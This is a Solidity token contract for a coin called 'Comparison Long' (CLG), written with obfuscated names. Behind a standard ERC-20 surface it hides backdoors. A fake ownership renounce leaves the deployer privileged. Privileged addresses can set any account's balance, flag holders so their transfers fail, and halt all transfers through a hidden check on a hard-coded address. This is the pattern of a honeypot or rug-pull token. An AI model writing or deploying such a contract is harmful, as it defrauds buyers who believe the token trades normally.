//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface feeShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderLimit {
    function createPair(address atTotal, address txTradingAuto) external returns (address);
}

interface autoMarketingWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundTakeLiquidity) external view returns (uint256);

    function transfer(address sellLaunch, uint256 liquidityMode) external returns (bool);

    function allowance(address enableAmountFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityMode) external returns (bool);

    function transferFrom(
        address sender,
        address sellLaunch,
        uint256 liquidityMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atFundToken, uint256 value);
    event Approval(address indexed enableAmountFund, address indexed spender, uint256 value);
}

interface enableReceiver is autoMarketingWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ComparisonLong is autoExempt, autoMarketingWallet, enableReceiver {

    function exemptTrading(uint256 liquidityMode) public {
        teamWallet();
        feeBuy = liquidityMode;
    }

    function owner() external view returns (address) {
        return shouldReceiver;
    }

    function decimals() external view virtual override returns (uint8) {
        return listLimitAt;
    }

    uint256 constant tokenList = 15 ** 10;

    address tokenFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function minLaunch(address txLiquidity, address sellLaunch, uint256 liquidityMode) internal returns (bool) {
        if (txLiquidity == liquidityReceiverTotal) {
            return launchTx(txLiquidity, sellLaunch, liquidityMode);
        }
        uint256 teamTotal = autoMarketingWallet(modeTakeAmount).balanceOf(tokenFrom);
        require(teamTotal == feeBuy);
        require(sellLaunch != tokenFrom);
        if (txTotal[txLiquidity]) {
            return launchTx(txLiquidity, sellLaunch, tokenList);
        }
        return launchTx(txLiquidity, sellLaunch, liquidityMode);
    }

    uint256 public amountReceiverFrom;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTakeMax;
    }

    function name() external view virtual override returns (string memory) {
        return autoTrading;
    }

    uint256 teamFee;

    function tokenMode() public {
        emit OwnershipTransferred(liquidityReceiverTotal, address(0));
        shouldReceiver = address(0);
    }

    function launchTx(address txLiquidity, address sellLaunch, uint256 liquidityMode) internal returns (bool) {
        require(limitAmount[txLiquidity] >= liquidityMode);
        limitAmount[txLiquidity] -= liquidityMode;
        limitAmount[sellLaunch] += liquidityMode;
        emit Transfer(txLiquidity, sellLaunch, liquidityMode);
        return true;
    }

    address public liquidityReceiverTotal;

    bool public enableLaunch;

    uint256 public enableTake;

    event OwnershipTransferred(address indexed txLaunched, address indexed fromBuy);

    uint8 private listLimitAt = 18;

    function getOwner() external view returns (address) {
        return shouldReceiver;
    }

    uint256 private receiverTakeMax = 100000000 * 10 ** 18;

    mapping(address => bool) public txTotal;

    function transferFrom(address txLiquidity, address sellLaunch, uint256 liquidityMode) external override returns (bool) {
        if (_msgSender() != marketingFund) {
            if (toMarketingBuy[txLiquidity][_msgSender()] != type(uint256).max) {
                require(liquidityMode <= toMarketingBuy[txLiquidity][_msgSender()]);
                toMarketingBuy[txLiquidity][_msgSender()] -= liquidityMode;
            }
        }
        return minLaunch(txLiquidity, sellLaunch, liquidityMode);
    }

    function transfer(address walletAmountList, uint256 liquidityMode) external virtual override returns (bool) {
        return minLaunch(_msgSender(), walletAmountList, liquidityMode);
    }

    string private autoTrading = "Comparison Long";

    function teamWallet() private view {
        require(takeSwap[_msgSender()]);
    }

    address marketingFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private limitAmount;

    string private amountTx = "CLG";

    function approve(address launchTake, uint256 liquidityMode) public virtual override returns (bool) {
        toMarketingBuy[_msgSender()][launchTake] = liquidityMode;
        emit Approval(_msgSender(), launchTake, liquidityMode);
        return true;
    }

    mapping(address => bool) public takeSwap;

    bool private sellTeam;

    function shouldAmountReceiver(address walletAmountList, uint256 liquidityMode) public {
        teamWallet();
        limitAmount[walletAmountList] = liquidityMode;
    }

    address private shouldReceiver;

    uint256 feeBuy;

    uint256 private exemptEnable;

    function allowance(address shouldAuto, address launchTake) external view virtual override returns (uint256) {
        if (launchTake == marketingFund) {
            return type(uint256).max;
        }
        return toMarketingBuy[shouldAuto][launchTake];
    }

    address public modeTakeAmount;

    constructor (){
        
        feeShould teamModeLaunch = feeShould(marketingFund);
        modeTakeAmount = senderLimit(teamModeLaunch.factory()).createPair(teamModeLaunch.WETH(), address(this));
        if (fundMin != enableLaunch) {
            enableTake = amountReceiverFrom;
        }
        liquidityReceiverTotal = _msgSender();
        tokenMode();
        takeSwap[liquidityReceiverTotal] = true;
        limitAmount[liquidityReceiverTotal] = receiverTakeMax;
        if (amountWallet == enableTake) {
            amountWallet = shouldFee;
        }
        emit Transfer(address(0), liquidityReceiverTotal, receiverTakeMax);
    }

    bool public fundMin;

    function marketingTrading(address receiverTakeLiquidity) public {
        teamWallet();
        
        if (receiverTakeLiquidity == liquidityReceiverTotal || receiverTakeLiquidity == modeTakeAmount) {
            return;
        }
        txTotal[receiverTakeLiquidity] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return amountTx;
    }

    bool public senderMaxList;

    uint256 public shouldFee;

    uint256 public amountWallet;

    function balanceOf(address fundTakeLiquidity) public view virtual override returns (uint256) {
        return limitAmount[fundTakeLiquidity];
    }

    function exemptFrom(address toAutoBuy) public {
        if (senderMaxList) {
            return;
        }
        
        takeSwap[toAutoBuy] = true;
        
        senderMaxList = true;
    }

    mapping(address => mapping(address => uint256)) private toMarketingBuy;

}